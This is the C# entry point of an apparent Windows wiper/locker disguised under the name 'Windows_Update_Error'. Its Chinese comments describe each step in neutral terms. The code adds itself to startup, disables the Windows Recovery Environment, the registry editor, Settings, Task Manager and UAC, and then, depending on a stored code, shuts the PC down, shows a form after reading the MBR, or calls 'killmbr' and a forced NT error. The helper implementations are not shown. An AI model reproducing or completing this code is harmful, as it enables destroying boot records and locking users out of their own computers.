using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;

namespace Windows_Update_Error
{
    public static class Program
    {
        // 定义一个字节数组，用于存储主引导记录（MBR）相关的数据，后续在程序流程中根据相应条件进行赋值与使用
        public static byte[] MBR;

        /// <summary>
        /// 应用程序的主入口点，程序将从这里开始执行，在此协调与系统配置及功能调整相关的各类操作，按照既定逻辑依次调用相关方法来实现不同功能。
        /// </summary>
        [STAThread]
        static void Main()
        {
            // 初始化应用程序的配置信息，这是保障应用程序能正常加载并依据配置运行的基础步骤
            ApplicationConfiguration.Initialize();

            // 创建Regedit_Set类的实例，此类封装了与系统注册表相关操作的逻辑，该实例用于执行注册表设置以及系统启动配置相关操作
            Regedit_Set regedit1 = new Regedit_Set();

            // 创建Test类的实例，该类负责执行诸如禁用特定Windows功能、处理电脑关机或重启等各类测试及具体操作
            Test test1 = new Test();

            // 调用regedit1对象的Start_Detection方法获取启动码，此启动码用于后续程序逻辑中的条件判断，决定程序执行不同分支路径
            string regedit1_Start = regedit1.Start_Detection();

            try
            {
                // 调用regedit1对象的PC_Start方法，该方法负责将程序添加到电脑开机启动项中，同时按照程序要求对关键系统启动设置进行相应修改
                regedit1.PC_Start(Regedit_Set.Local_1);

                // 调用test1对象的Disable_WinRE方法，此方法用于禁用Windows恢复环境，使得用户无法通过常规途径访问系统恢复选项
                test1.Disable_WinRE();

                // 调用regedit1对象的Disable_Regedit方法，用于禁止用户对系统注册表进行访问，以此保护注册表完整性，防止未经授权的更改
                regedit1.Disable_Regedit();

                // 调用regedit1对象的Disable_Windows方法并传入true，其功能是按照程序设定对Windows系统的相关功能进行禁用，具体被禁用的功能由该方法内部实现决定
                regedit1.Disable_Windows(true);
            }
            catch (Exception ex)
            {
                // 若上述操作出现异常，此代码块捕获异常，并通过弹出消息框显示错误消息，消息框含“确定”按钮及错误图标，提示用户出现问题
                MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            // 调用regedit1对象的UAC_OFF方法，该方法用于关闭用户账户控制（UAC）功能，关闭后会改变系统安全提示及部分用户操作的访问权限级别
            regedit1.UAC_OFF();

            // 调用regedit1对象的Disable_Settings方法，此方法用于禁用用户对系统设置和任务管理器的访问，限制用户修改系统配置及管理正在运行的进程
            regedit1.Disable_Settings();

            if (regedit1_Start == "114514")
            {
                // 当启动码为"114514"时，将启动码的值修改为"4397382"，后续依据此新值进行相应操作
                regedit1_Start = "4397382";
                // 调用regedit1对象的Start_Update方法，传入修改后的启动码，用于启动特定的系统更新相关操作，具体更新内容由该方法内部逻辑决定
                regedit1.Start_Update(regedit1_Start);
                // 让当前线程暂停执行5000毫秒（即5秒），为前面的更新操作预留时间来完成后台任务或等待系统达到特定状态
                Thread.Sleep(5000);
                // 调用test1对象的Shutdown_PC方法，执行关闭电脑的操作，实现程序控制下的关机功能
                test1.Shutdown_PC();
            }
            else if (regedit1_Start == "4397382")
            {
                // 当启动码为"4397382"时，调用Test类的GetMbr方法获取主引导记录（MBR）的数据，并赋值给定义的MBR字节数组，以便后续使用
                MBR = Test.GetMbr();
                // 启动名为Form2的Windows Forms应用程序窗口，Form2窗口承载后续要展示给用户的界面内容或相关操作逻辑
                Application.Run(new Form2());
            }
            else
            {
                // 当启动码既不是"114514"也不是"4397382"时，执行以下操作
                // 调用test1对象的killmbr方法，该方法用于执行与主引导记录（MBR）相关的特定操作，具体操作由该方法内部实现定义
                test1.killmbr();
                // 调用test1对象的Nt_Error方法，用于处理和Windows NT系统相关的特定错误情况，具体错误处理逻辑在该方法内部实现
                test1.Nt_Error();
            }
        }
    }
}